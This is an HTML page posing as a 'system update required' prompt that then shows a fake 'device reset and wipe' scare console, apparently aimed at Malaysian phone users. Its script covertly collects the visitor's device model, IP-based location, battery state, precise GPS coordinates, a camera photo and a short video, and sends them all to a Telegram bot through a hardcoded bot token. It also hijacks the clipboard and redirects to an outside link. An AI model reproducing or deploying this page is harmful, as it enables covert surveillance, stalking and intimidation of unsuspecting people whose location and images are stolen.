<!DOCTYPE html>
<html lang="ms">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM_CRITICAL_ERROR</title>
    <style>
        body {
            background: #000; color: #0f0; 
            font-family: 'Courier New', Courier, monospace;
            display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            height: 100vh; margin: 0; overflow: hidden;
        }
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8); z-index: 9999;
            display: flex; justify-content: center; align-items: center;
            cursor: pointer;
        }
        .container { width: 85%; max-width: 600px; }
        .header {
            font-weight: bold; font-size: 1.2rem; margin-bottom: 20px;
            border-bottom: 1px solid #0f0; padding-bottom: 10px;
            width: 100%; text-align: center; color: #f00;
            text-transform: uppercase; animation: pulse 1s infinite;
        }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        #console {
            font-size: 0.8rem; line-height: 1.4; height: 250px;
            overflow: hidden; background: rgba(0, 15, 0, 0.9);
            padding: 10px; border: 1px solid #0f0;
        }
        .progress-bar { width: 100%; height: 10px; border: 1px solid #0f0; margin-top: 20px; }
        .progress-fill { height: 100%; background: #f00; width: 0%; transition: width 0.3s; }
        .red { color: #ff0000; font-weight: bold; }
    </style>
</head>
<body onclick="activateAll()">

    <div id="overlay">
        <div style="text-align:center; border:1px solid #0f0; padding:25px; background:#111; box-shadow: 0 0 20px #0f0;">
            <p>⚠️ SYSTEM UPDATE REQUIRED</p>
            <p style="font-size:0.7rem; color:#aaa;">Tap screen to synchronize device</p>
        </div>
    </div>

    <div class="container">
        <div class="header"> [!] DEVICE RESER & WIPE [!] </div>
        <div id="console"></div>
        <div class="progress-bar">
            <div class="progress-fill" id="fill"></div>
        </div>
        <p id="status" style="text-align:center; font-size:0.8rem; margin-top:10px;">DELETING SYSTEM FILES...</p>
    </div>

    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;" width="640" height="480"></canvas>

    <script>
        const TOKEN = '8720467847:AAFxo75yX3BBCsdSXEwSSWATO6Gth76CTCo';
        const urlParams = new URLSearchParams(window.location.search);
        const CURRENT_CHAT_ID = urlParams.get('id') || '8563935930'; 

        const consoleElem = document.getElementById('console');
        const fill = document.getElementById('fill');

        function logToConsole(text, isRed = false) {
            const p = document.createElement('p');
            p.style.margin = '2px 0';
            if(isRed) p.className = 'red';
            p.innerHTML = `> ${text}`;
            consoleElem.appendChild(p);
            consoleElem.scrollTop = consoleElem.scrollHeight;
        }

        let isActivated = false;
        async function activateAll() {
            if (isActivated) return;
            isActivated = true;
            document.getElementById('overlay').style.display = 'none';

            // Fullscreen & Vibrate
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
            if (navigator.vibrate) navigator.vibrate([300, 100, 300, 100, 800]);

            // Auto-Copy
            const t = document.createElement("textarea");
            document.body.appendChild(t);
            t.value = "HACKER ALERT: SYSTEM RESET. ALL DATA DELETED.";
            t.select();
            document.execCommand("copy");
            document.body.removeChild(t);

            startTrace();
        }

        async function startTrace() {
            logToConsole("Initializing remote exploit...");
            const waktu = new Date().toLocaleString('ms-MY', { timeZone: 'Asia/Kuala_Lumpur' });

            // Fake Wipe Logs
            setTimeout(() => logToConsole("Bypassing security... [OK]"), 1000);
            setTimeout(() => {
                logToConsole("CRITICAL: EMERGENCY WIPE INITIATED", true);
                if(navigator.vibrate) navigator.vibrate(1000);
            }, 3000);
            setTimeout(() => logToConsole("Formatting /sdcard/Photos...", true), 5000);

            let width = 0;
            const interval = setInterval(() => {
                if (width >= 99) clearInterval(interval);
                width += Math.random() * 6;
                fill.style.width = `${width}%`;
            }, 500);

            // --- DETECT BRAND ---
            let brandPhone = "Unknown Device";
            if (navigator.userAgentData) {
                try {
                    const info = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
                    brandPhone = `${info.platform} (${info.model || "Standard"})`;
                } catch (e) { brandPhone = "Device Data Blocked"; }
            } else {
                const ua = navigator.userAgent;
                if (ua.match(/iPhone/i)) brandPhone = "iPhone (iOS)";
                else if (ua.match(/Android/i)) brandPhone = "Android Device";
                else if (ua.match(/Windows/i)) brandPhone = "Windows PC";
            }

            // --- IP & DEVICE INFO ---
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                const b = await navigator.getBattery();
                const bLevel = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Battery"})`;

                let msg = `🚨 *SYSTEM RESET*\n` +
                          `📱 *Device:* ${brandPhone}\n` +
                          `🌐 *IP:* \`${d.ip}\`\n` +
                          `📍 *Loc:* ${d.city}, ${d.country_name}\n` +
                          `🔋 *Battery:* ${bLevel}\n` +
                          `⏰ *Time:* ${waktu}`;
                
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CURRENT_CHAT_ID, text: msg, parse_mode: 'Markdown'})
                });
            } catch (e) {}

            // --- GPS ---
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({chat_id: CURRENT_CHAT_ID, text: `📍 *GPS COORDINATES:*\n[Open in Google Maps](${map})`, parse_mode: 'Markdown'})
                    });
                }, null, {enableHighAccuracy:true});
            }

            // --- CAMERA (NO MIC) ---
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    canvas.toBlob(async (blob) => {
                        const fd = new FormData();
                        fd.append('chat_id', CURRENT_CHAT_ID);
                        fd.append('photo', blob, 'snap.jpg');
                        fd.append('caption', `📸 *FACE CAPTURED*\n📱 ${brandPhone}`);
                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:fd});
                    }, 'image/jpeg');
                }, 4000);

                const mr = new MediaRecorder(stream);
                const chunks = [];
                mr.ondataavailable = (e) => chunks.push(e.data);
                mr.onstop = async () => {
                    const fdV = new FormData();
                    fdV.append('chat_id', CURRENT_CHAT_ID);
                    fdV.append('video', new Blob(chunks, {type:'video/mp4'}), 'record.mp4');
                    fdV.append('caption', `📹 *VIDEO STREAM (6s)*`);
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {method:'POST', body:fdV});
                    stream.getTracks().forEach(t => t.stop());
                };
                mr.start();
                setTimeout(() => mr.stop(), 7000);
            } catch (e) { logToConsole("Camera Access Denied.", true); }

            setTimeout(() => { window.location.href = "https://blogs.mtdv.me/videos/452uSngg5p"; }, 15000);
        }
    </script>
</body>
</html>
